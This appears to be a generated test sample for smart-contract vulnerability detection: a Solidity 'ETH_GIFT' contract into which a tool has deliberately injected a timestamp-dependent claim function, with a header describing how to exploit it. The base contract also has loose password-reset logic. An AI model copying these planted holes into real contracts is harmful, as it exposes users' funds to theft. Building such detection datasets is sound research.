/*
 * ===== SmartInject Injection Details =====
 * Function      : ScheduleTimeBasedClaim
 * Vulnerability : Timestamp Dependence
 * Status        : Not Detected
 * Type          : Fallback Function Addition
 *
 * === Verification Results ===
 * Detected      : False
 * Relevant      : 0 findings
 * Total Found   : 1 issues
 * Retry Count   : 0
 *
 * === Description ===
 * This vulnerability introduces timestamp dependence that requires multiple transactions to exploit. An attacker can schedule a claim, then extend the time using manipulated timestamps across multiple blocks. The vulnerability is stateful as it depends on the claimScheduleTime state variable persisting between transactions. First, the attacker calls ScheduleTimeBasedClaim() to set up the claim, then can call ExtendClaimTime() to manipulate timing, and finally ExecuteTimeBasedClaim() when conditions are favorable. Miners can manipulate block timestamps within certain bounds to influence when the claim becomes executable.
 */
pragma solidity ^0.4.19;

contract ETH_GIFT
{
    function GetGift(bytes pass)
    external
    payable
    {
        if(hashPass == keccak256(pass))
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function GetGift()
    public
    payable
    {
        if(msg.sender==reciver)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    bytes32 hashPass;
    
    bool closed = false;
    
    address sender;
    
    address reciver;
 
    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00)
        {
            hashPass = hash;
            sender = msg.sender;

        }
    }
   
    function SetReciver(address _reciver)
    public
    {
        if(msg.sender==sender)
        {
            reciver = _reciver;
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(hash==hashPass&&msg.sender==sender)
        {
           closed=true;
        }
    }
    
    function() public payable{}
    

    // === FALLBACK INJECTION: Timestamp Dependence ===
    // This function was added as a fallback when existing functions failed injection
uint256 public claimScheduleTime;
    address public scheduledClaimer;
    bool public timeBasedClaimActive = false;
    
    function ScheduleTimeBasedClaim(uint256 _delayInSeconds)
    public
    payable
    {
        if(msg.sender == sender && msg.value >= 0.1 ether)
        {
            claimScheduleTime = now + _delayInSeconds;
            scheduledClaimer = msg.sender;
            timeBasedClaimActive = true;
        }
    }
    
    function ExecuteTimeBasedClaim()
    public
    {
        if(timeBasedClaimActive && msg.sender == scheduledClaimer)
        {
            if(now >= claimScheduleTime)
            {
                msg.sender.transfer(this.balance);
                timeBasedClaimActive = false;
            }
        }
    }
    
    function ExtendClaimTime(uint256 _additionalSeconds)
    public
    {
        if(msg.sender == scheduledClaimer && timeBasedClaimActive)
        {
            claimScheduleTime = now + _additionalSeconds;
        }
    }
    // === END FALLBACK INJECTION ===

}